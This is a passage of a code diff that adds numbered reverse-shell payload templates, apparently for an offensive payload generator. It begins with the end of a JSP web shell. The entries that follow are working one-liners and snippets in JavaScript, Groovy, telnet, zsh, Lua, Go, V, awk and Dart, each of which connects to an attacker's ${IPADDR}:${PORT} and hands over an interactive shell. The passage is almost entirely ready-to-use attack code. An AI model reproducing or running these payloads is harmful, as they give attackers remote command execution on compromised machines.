+        }
+    }
+    // TCP PORT PART
+    class StreamConnector extends Thread
+    {
+        InputStream wz;
+        OutputStream yr;
+        StreamConnector( InputStream wz, OutputStream yr ) {
+            this.wz = wz;
+            this.yr = yr;
+        }
+        public void run()
+        {
+            BufferedReader r  = null;
+            BufferedWriter w = null;
+            try
+            {
+                r  = new BufferedReader(new InputStreamReader(wz));
+                w = new BufferedWriter(new OutputStreamWriter(yr));
+                char buffer[] = new char[8192];
+                int length;
+                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
+                {
+                    w.write( buffer, 0, length );
+                    w.flush();
+                }
+            } catch( Exception e ){}
+            try
+            {
+                if( r != null )
+                    r.close();
+                if( w != null )
+                    w.close();
+            } catch( Exception e ){}
+        }
+    }
+ 
+    try {
+        Socket socket = new Socket( \"${IPADDR}\", ${PORT} ); // Replace with wanted ip and port
+        Process process = Runtime.getRuntime().exec( shellPath );
+        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
+        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
+        out.println(\"port opened on \" + socket);
+     } catch( Exception e ) {}
+%>
+</pre>
+</body>
+</html>"
+	# 58. Javascript
+	"String command = \"var host = '${IPADDR}';\" +
+                       \"var port = ${PORT};\" +
+                       \"var cmd = '${SHELLTYPE}';\"+
+                       \"var s = new java.net.Socket(host, port);\" +
+                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+
+                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+
+                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+
+                       \"print ('Connected');\"+
+                       \"while (!s.isClosed()) {\"+
+                       \"    while (pi.available() > 0)\"+
+                       \"        so.write(pi.read());\"+
+                       \"    while (pe.available() > 0)\"+
+                       \"        so.write(pe.read());\"+
+                       \"    while (si.available() > 0)\"+
+                       \"        po.write(si.read());\"+
+                       \"    so.flush();\"+
+                       \"    po.flush();\"+
+                       \"    java.lang.Thread.sleep(50);\"+
+                       \"    try {\"+
+                       \"        p.exitValue();\"+
+                       \"        break;\"+
+                       \"    }\"+
+                       \"    catch (e) {\"+
+                       \"    }\"+
+                       \"}\"+
+                       \"p.destroy();\"+
+                       \"s.close();\";
+String x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";
+ref.add(new StringRefAddr(\"x\", x);"
+	# 59. Groovy
+	"String host=\"${IPADDR}\";int port=${PORT};String cmd=\"${SHELLTYPE}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
+	# 60. telnet
+	"TF=$(mktemp -u);mkfifo \$TF && telnet ${IPADDR} ${PORT} 0<\$TF | ${SHELLTYPE} 1>\$TF"
+	# 61. zsh
+	"zsh -c 'zmodload zsh/net/tcp && ztcp ${IPADDR} ${PORT} && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'"
+	# 62. Lua #1
+	"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('${IPADDR}','${PORT}');os.execute('${SHELLTYPE} -i <&3 >&3 2>&3');\""
+	# 63. Lua #2
+	"lua5.1 -e 'local host, port = \"${IPADDR}\", ${PORT} local socket = require(\"socket\") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"
+	# 64. Golang
+	"echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"${IPADDR}:${PORT}\");cmd:=exec.Command(\"${SHELLTYPE}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
+	# 65. Vlang
+	"echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e ${SHELLTYPE} ${IPADDR} ${PORT} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"
+	# 66. Awk
+	"awk 'BEGIN {s = \"/inet/tcp/0/${IPADDR}/${PORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+	# 67. Dart
+	"import 'dart:io';
+import 'dart:convert';
+
+main() {
+  Socket.connect(\"${IPADDR}\", ${PORT}).then((socket) {
+    socket.listen((data) {
+      Process.start('${SHELLTYPE}', []).then((Process process) {
+        process.stdin.writeln(new String.fromCharCodes(data).trim());
+        process.stdout
+          .transform(utf8.decoder)
+          .listen((output) { socket.write(output); });
+      });
+    },
+    onDone: () {
+      socket.destroy();
+    });
+  });
+}"
+)
 
 #
 # Bind Shell Payloads
